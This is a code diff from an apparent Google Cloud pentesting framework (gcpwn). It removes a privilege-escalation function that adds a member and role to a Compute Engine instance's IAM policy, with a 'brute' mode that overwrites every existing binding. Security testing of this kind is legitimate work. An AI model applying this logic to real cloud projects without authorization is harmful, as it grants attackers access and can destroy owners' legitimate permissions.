@@ -33,7 +33,6 @@ from google.api_core.exceptions import Forbidden
 from google.api_core.extended_operation import ExtendedOperation
 from google.cloud import compute_v1
 
-from gcpwn.modules.gcp.iam.utilities.helpers import compute_instance_get_iam_policy, instance_set_iam_policy
 from gcpwn.core.console import UtilityTools
 from gcpwn.core.contracts import HashableResourceProxy
 from gcpwn.core.output_paths import resolve_download_path
@@ -975,74 +974,6 @@ def add_metadata(
         if output:
             action_dict.setdefault("project_permissions", {}).setdefault(project_id, set()).add("compute.projects.setCommonInstanceMetadata")            
         return output 
-
-def add_instance_iam_member(instance_client, instance_name, project_id, zone, member, action_dict, brute = False, role = None, debug=False):
-    """Grant a member/role on an instance's IAM policy (privesc); --brute overwrites the whole policy.
-
-    Default fetches the current policy and appends the binding. brute=True replaces ALL bindings
-    with just the new one (destructive; use when getIamPolicy is denied but setIamPolicy works).
-    Records compute.instances.getIamPolicy/setIamPolicy into action_dict. Returns the set-policy
-    result, or -1 when the instance is missing (sentinel ``404`` from the get).
-    """
-    additional_bind = {"role": role, "members": [member]}
-    policy_dict = {}
-
-    if brute:
-        print(f"[*] Overwiting {instance_name} to just be {member}")
-
-        policy_dict["bindings"] = []
-        policy_dict["bindings"].append(additional_bind)
-        policy_dict["version"] = 1
-        policy = policy_dict
-
-    else:
-
-        print(f"[*] Fetching current policy for {instance_name}...")
-        policy = compute_instance_get_iam_policy(instance_client, project_id, instance_name, zone, debug=debug)
-    
-        if policy:
-
-            if policy == 404:
-
-                print(f"{UtilityTools.RED}[X] Exiting the module as {instance_name} does not exist. Double check the name.{UtilityTools.RESET}")
-                return -1
-
-            else:
-
-                action_dict.setdefault(project_id, {}).setdefault("compute.instances.getIamPolicy", {}).setdefault("instances", set()).add(instance_name)
-                
-                policy_dict["bindings"] = list(policy.bindings)
-                policy_dict["bindings"].append(additional_bind)
-                policy_dict["etag"] = policy.etag
-                policy_dict["version"] = policy.version
-                policy = policy_dict
-        
-        else:
-            print(f"{UtilityTools.RED}[X] Exiting the module as current policy could not be retrieved to append. Try again and supply --brute to OVERWRITE entire bucket IAM policy if needed. NOTE THIS WILL OVERWRITE ALL PREVIOUS BINDINGS POTENTIALLY{UtilityTools.RESET}")
-            return -1
-
-    if policy is not None:
-        policy_bindings = policy_dict["bindings"]
-        print(f"[*] New policy below being added to {instance_name} \n{policy_bindings}")
-
-    else:
-        print(f"{UtilityTools.RED}[X] Exiting the module due to new policy not being created to add.{UtilityTools.RESET}")
-        return -1
-
-    status = instance_set_iam_policy(instance_client, instance_name, project_id, zone, policy, debug=debug)
-    
-    if status:
-        if status == 404:
-            print(
-                f"{UtilityTools.RED}[X] Exiting the module as {instance_name} does not exist. "
-                f"Double check the name.{UtilityTools.RESET}"
-            )
-            return -1
-
-        else:
-            action_dict.setdefault(project_id, {}).setdefault("compute.instances.setIamPolicy", {}).setdefault("instances", set()).add(instance_name)
-
-    return status
 
 
 @dataclass(frozen=True)
